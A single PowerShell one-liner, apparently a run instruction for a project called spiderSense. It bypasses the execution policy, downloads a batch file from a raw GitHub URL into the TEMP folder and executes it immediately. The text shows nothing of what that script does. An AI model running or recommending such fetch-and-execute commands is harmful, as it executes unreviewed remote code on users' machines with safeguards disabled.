```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr 'https://raw.githubusercontent.com/09sychic/spiderSense/main/run.bat' -OutFile '$env:TEMP\run.bat'; & '$env:TEMP\run.bat'"
```
